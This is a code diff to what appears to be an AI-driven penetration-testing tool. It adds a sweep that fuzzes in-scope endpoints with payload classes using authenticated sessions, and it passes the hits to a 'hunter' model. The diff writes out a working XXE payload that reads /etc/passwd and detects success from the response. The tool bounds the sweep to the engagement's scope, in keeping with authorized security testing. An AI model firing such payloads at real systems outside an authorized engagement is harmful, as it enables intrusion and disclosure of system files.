@@ -19,6 +19,8 @@ import {
   type SpineBeatRecord,
 } from "./spine.js";
 import { buildHunterBrief, openAuthenticatedClasses, deriveOrigins, resolveRelativeEndpoint } from "./brief.js";
+import { runSweep, renderSweepLeads, SWEEP_PAYLOADS, type SendProbe, type SweepHit } from "./sweep.js";
+import { readArtifactRecords, deriveTargets, setAtPath, type SweepTargetWithBody } from "./sweep-targets.js";
 
 // Re-exported for backward compatibility: existing callers (and test/beat.test.ts)
 // import these from beat.js. The vocabulary itself now lives in vuln-classes.ts so
@@ -191,6 +193,81 @@ const CAUSE_GUIDANCE: Record<FailureCause, string> = {
   unknown:
     "The verifier could not attribute a specific cause to this failure.",
 };
+
+/**
+ * Deep-mode sweep pre-pass. Derives fuzz targets from the framework's own captured
+ * requests (artifact store), fires each payload class at each input via the Tether-gated
+ * http_request path, and returns the strong hits as a hunter directive. Fails soft.
+ */
+async function runDeepSweep(opts: {
+  runner: ToolRunner; workspace: string; scopeOrigins: string[];
+  canon: (u: string) => string; budget: number;
+}): Promise<string> {
+  try {
+    const records = await readArtifactRecords(join(opts.workspace, "artifacts"));
+    const inScope = (u: string) => { try { return opts.scopeOrigins.includes(new URL(u).origin); } catch { return false; } };
+    const targets = deriveTargets(records, inScope, opts.canon) as SweepTargetWithBody[];
+    if (targets.length === 0) return "";
+    const sessionLabel = opts.runner.getSessionMeta().find((m) => m.has_auth_material)?.label;
+
+    const send: SendProbe = async (target, param, value) => {
+      const t = target as SweepTargetWithBody;
+      const v = value === null ? "sahwbenign" : value;
+      let url = t.endpoint;
+      let body: string | null = null;
+      const headers: Record<string, string> = { ...(t.headers || {}) };
+      // Drop any stale/redacted auth header; the runner injects real auth via `session`.
+      delete headers.Authorization; delete headers.authorization;
+      if (t.paramKind[param] === "json" && t.bodyTemplate) {
+        try { body = JSON.stringify(setAtPath(JSON.parse(t.bodyTemplate), param, v)); }
+        catch { body = t.bodyTemplate; }
+        if (!headers["Content-Type"] && !headers["content-type"]) headers["Content-Type"] = "application/json";
+      } else {
+        try { const u = new URL(t.endpoint); u.searchParams.set(param, v); url = u.toString(); } catch { /* keep */ }
+      }
+      const args: Record<string, unknown> = { method: t.method, url, headers, body };
+      if (sessionLabel) args.session = sessionLabel;
+      const r = await opts.runner.execute("http_request", args);
+      if (!r.ok) return { status: 0, body: "" };
+      const cap = r.result as HttpCapture;
+      return { status: cap.response.status, body: cap.response.body ?? "", ms: cap.ms };
+    };
+
+    const fieldHits = await runSweep({ targets, payloadsFor: (c) => SWEEP_PAYLOADS[c] ?? [], send, budget: opts.budget });
+    const xxeHits = await sweepXxe(targets, opts.runner, sessionLabel);
+    return renderSweepLeads([...fieldHits, ...xxeHits]);
+  } catch { return ""; }
+}
+
+/** Whole-body XXE probe (field-injection cannot express an XML external entity). One
+ * bounded payload per body-bearing endpoint; a returned /etc/passwd signature is a hit. */
+async function sweepXxe(targets: SweepTargetWithBody[], runner: ToolRunner, sessionLabel?: string): Promise<SweepHit[]> {
+  const hits: SweepHit[] = [];
+  const xml = `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY sahwx SYSTEM "file:///etc/passwd">]><r><x>&sahwx;</x></r>`;
+  let n = 0;
+  for (const t of targets) {
+    if (n >= 8) break;
+    if (t.method !== "POST" && t.method !== "PUT" && t.method !== "PATCH") continue;
+    if (!t.bodyTemplate) continue;
+    n++;
+    const args: Record<string, unknown> = {
+      method: t.method, url: t.endpoint,
+      headers: { "Content-Type": "application/xml", Accept: "application/xml" }, body: xml,
+    };
+    if (sessionLabel) args.session = sessionLabel;
+    const r = await runner.execute("http_request", args);
+    if (!r.ok) continue;
+    const cap = r.result as HttpCapture;
+    if ((cap.response.body ?? "").includes("root:x:0:0")) {
+      hits.push({
+        vuln_class: "xxe", endpoint: t.endpoint, param: "(xml body)", payload: xml, strength: "strong",
+        observed: "root:x:0:0",
+        note: "external entity read /etc/passwd; send with Content-Type application/xml, body_contains the entity content",
+      });
+    }
+  }
+  return hits;
+}
 
 /** Bound a verdict rationale so it stays a compact record field (never a wall of text). */
 function boundReason(s: string): string {
@@ -841,6 +918,20 @@ export async function runBeat(opts: {
   // exact absolute in-scope URL. Computed from the identical state → consistent per beat.
   const briefOrigins = deriveOrigins(briefState);
 
+  // DEEP-MODE SWEEP PRE-PASS (off by default). Deterministically fires every payload
+  // class at every discovered input (JSON body leaves + query params, derived from the
+  // framework's OWN captured requests — no DB/answer-key), judged by the pure fuzz
+  // oracle. Strong hits become a high-priority brief directive the hunter submits first;
+  // the Axiom still decides, and canonicalizeEndpoint records the win on the canonical
+  // route. Fails soft — any error yields no leads and the normal loop proceeds.
+  let sweepLeads = "";
+  if (engagement.deep.sweep) {
+    sweepLeads = await runDeepSweep({
+      runner, workspace, scopeOrigins, canon: canonicalizeEndpoint,
+      budget: engagement.deep.maxSweepRequests,
+    });
+  }
+
   try {
     // One Langfuse trace per beat; one SESSION per run, so runs are comparable.
     // The engagement stays discoverable via the tag and metadata below.
@@ -1040,7 +1131,9 @@ export async function runBeat(opts: {
             client: opts.client,
             model: opts.env.SAHW_MODEL ?? "model",
             system: hunterBrief,
-            user: `In-scope: ${scopeUrls.join(", ")}`,
+            user: sweepLeads
+              ? `In-scope: ${scopeUrls.join(", ")}\n\n${sweepLeads}`
+              : `In-scope: ${scopeUrls.join(", ")}`,
             tools: hunterTools,
             runner,
             maxTurns: perCallMaxTurns,
